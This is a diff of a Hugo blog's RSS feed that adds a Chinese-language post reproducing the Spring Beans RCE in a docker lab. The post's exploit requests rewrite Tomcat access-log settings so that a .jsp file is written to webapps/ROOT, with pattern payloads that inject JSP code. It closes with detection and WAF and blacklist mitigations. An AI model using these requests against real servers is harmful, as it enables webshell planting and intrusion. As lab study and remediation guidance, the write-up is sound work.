@@ -6,7 +6,195 @@
         <description>Recent content on cOOl &#39;s blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <lastBuildDate>Thu, 10 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://coollllllll.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 04 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://coollllllll.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Spring Beans RCE 复现</title>
+        <link>https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/</link>
+        <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Spring Beans RCE 复现" /&gt;&lt;h1 id=&#34;spring-beans-rce-复现&#34;&gt;Spring Beans RCE 复现&lt;/h1&gt;
+&lt;h2 id=&#34;影响范围&#34;&gt;影响范围&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;JDK &amp;gt;= 9&lt;/li&gt;
+&lt;li&gt;使用了 Spring 框架及其衍生框架&lt;code&gt;spring-beans-*.jar&lt;/code&gt;文件或存在&lt;code&gt;CachedIntrospectionResults.class&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h2&gt;
+&lt;p&gt;Spring MVC 框架的参数绑定功能支持将请求中的参数绑定到控制器方法中参数对象的成员变量，本质上就是参数绑定引发的变量覆盖漏洞。公开的利用链是通过求获取 AccessLogValve 对象并注入恶意字段值，从而触发 pipeline 机制实现任意路径下写文件。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
+&lt;h3 id=&#34;环境&#34;&gt;环境&lt;/h3&gt;
+&lt;p&gt;docker 镜像：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker pull vulfocus/spring-core-rce-2022-03-29:latest
+docker run -d -p 8080:8080 --name spring-core-rce vulfocus/spring-core-rce-2022-03-29
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;原理及利用&#34;&gt;原理及利用&lt;/h3&gt;
+&lt;p&gt;本质就是变量覆盖修改 tomcat 的 log 配置，实现在&lt;code&gt;webapp/path&lt;/code&gt;下写入 jsp，实现命令执行。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发送请求修改tomcat 日志文件名 和 路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 设置文件后缀为 .jsp
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+
+# 设置文件前缀为 shell
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+
+# 设置日志文件的路径为 webapps/path，只有该文件下的 jsp 文件会被解析
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;发送请求设置 log 的&lt;code&gt;pattern&lt;/code&gt; 和 &lt;code&gt;fileDateFormat&lt;/code&gt;，其中 pattern 具有固定格式，根据官方定义，pattern 的值可以是&lt;code&gt;common&lt;/code&gt; 和 &lt;code&gt;combined&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# common 的定义
+
+%a - Remote IP address. See also %{xxx}a below.
+%A - Local IP address
+%b - Bytes sent, excluding HTTP headers, or &#39;-&#39; if zero
+%B - Bytes sent, excluding HTTP headers
+%h - Remote host name (or IP address if enableLookups for the connector is false)
+%H - Request protocol
+%l - Remote logical username from identd (always returns &#39;-&#39;)
+%m - Request method (GET, POST, etc.)
+%p - Local port on which this request was received. See also %{xxx}p below.
+%q - Query string (prepended with a &#39;?&#39; if it exists)
+%r - First line of the request (method and request URI)
+%s - HTTP status code of the response
+%S - User session ID
+%t - Date and time, in Common Log Format
+%u - Remote user that was authenticated (if any), else &#39;-&#39; (escaped if required)
+%U - Requested URL path
+%v - Local server name
+%D - Time taken to process the request in millis. Note: In httpd %D is microseconds. Behaviour will be aligned to httpd in Tomcat 10 onwards.
+%T - Time taken to process the request, in seconds. Note: This value has millisecond resolution whereas in httpd it has second resolution. Behaviour will be align to httpd in Tomcat 10 onwards.
+%F - Time taken to commit the response, in milliseconds
+%I - Current request thread name (can compare later with stacktraces)
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# combined 定义
+
+%{xxx}a write remote address (client) (xxx==remote) or connection peer address (xxx=peer)
+
+%{xxx}i write value of incoming header with name xxx (escaped if required)
+
+%{xxx}o write value of outgoing header with name xxx (escaped if required)
+
+%{xxx}c write value of cookie with name xxx (escaped if required)
+
+%{xxx}r write value of ServletRequest attribute with name xxx (escaped if required)
+
+%{xxx}s write value of HttpSession attribute with name xxx (escaped if required)
+
+%{xxx}p write local (server) port (xxx==local) or remote (client) port (xxx=remote)
+
+%{xxx}t write timestamp at the end of the request formatted using the enhanced SimpleDateFormat pattern xxx
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本来是可以直接在 &lt;code&gt;pattern&lt;/code&gt;中直接写入 payload，例如：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25out.println(123);%25%3E
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果出现错误，主要是因为写入的字符中包含&lt;code&gt;%&lt;/code&gt;字符，该字符在日志配置中有特殊作用，因此报错如下：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 687; 
+			flex-basis: 1649px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146.png&#34; data-size=&#34;598x87&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146.png&#34;
+			width=&#34;598&#34;
+			height=&#34;87&#34;
+			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146_hu2e2f08fc3dbdfd9c1bfee9e8adc44420_20251_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146_hu2e2f08fc3dbdfd9c1bfee9e8adc44420_20251_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;所以尝试用&lt;code&gt;combined&lt;/code&gt;中的一些定义尝试写入 webshell，避免&lt;code&gt;%&lt;/code&gt;的直接写入：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 法一：根据定义使用 `%{xxx}i` 从 HTTP Header 去读取值并写入
+
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666
+
+GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Di HTTP/1.1
+Host: IP:PORT
+cmd: &amp;lt;%out.println(123);%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 652; 
+			flex-basis: 1565px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227.png&#34; data-size=&#34;600x92&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227.png&#34;
+			width=&#34;600&#34;
+			height=&#34;92&#34;
+			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227_hua4dcec7267d62fbe696774a95f968f4b_20741_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227_hua4dcec7267d62fbe696774a95f968f4b_20741_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;法一存在缺陷，无法写入&lt;code&gt;&amp;quot;&lt;/code&gt;，存在转义：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 960; 
+			flex-basis: 2305px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729.png&#34; data-size=&#34;365x38&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729.png&#34;
+			width=&#34;365&#34;
+			height=&#34;38&#34;
+			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729_hu932f94cb42644f9c986cabfd86d07389_6358_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729_hu932f94cb42644f9c986cabfd86d07389_6358_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 法二：根据定义使用 `%{xxx}t` 直接写入以 simpleDateFormat 格式定义的 timestamp，这个 timestamp 是可以包含 `%` 和 `&amp;quot;` 字符
+
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=888
+
+GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25%7B%25%7Dtout.println(%22mytest%22);%25%7B%25%7Dt%3E HTTP/1.1
+Host: IP:PORT
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 677; 
+			flex-basis: 1625px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751.png&#34; data-size=&#34;596x88&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751.png&#34;
+			width=&#34;596&#34;
+			height=&#34;88&#34;
+			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751_hu86292364a750163b8317ef225ca676bb_16104_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751_hu86292364a750163b8317ef225ca676bb_16104_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;排查与修复&#34;&gt;排查与修复&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;排查&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;jdk 版本&lt;/li&gt;
+&lt;li&gt;不论是 war 包还是 jar 包，解压后排查&lt;code&gt;spring-beans-*.jar&lt;/code&gt;格式的文件、排查&lt;code&gt;CachedIntrospectionResuLts.class&lt;/code&gt;文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;临时修复&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;依靠 WAF 规则中对参数中所有出现的 &lt;code&gt;class.*&lt;/code&gt;， &lt;code&gt;Class.*&lt;/code&gt;，&lt;code&gt;*.class.*&lt;/code&gt;， &lt;code&gt;*.Class.*&lt;/code&gt; 字符串过滤&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在应用中全局搜索&lt;code&gt;@InitBinder&lt;/code&gt;注解，看看方法体内是否调用&lt;code&gt;dataBinder.setDisallowedFields&lt;/code&gt;方法，如果发现此代码片段的引入，则在原来的黑名单中，添加&lt;code&gt;{&amp;quot;class.&amp;quot;,&amp;quot;Class.&amp;quot;,&amp;quot;.class.&amp;quot;, &amp;quot;.Class.&amp;quot;}&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;如果此代码片段使用较多,需要每个地方都追加&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>java 反序列化-1</title>
         <link>https://coollllllll.github.io/p/java-1/</link>
         <pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
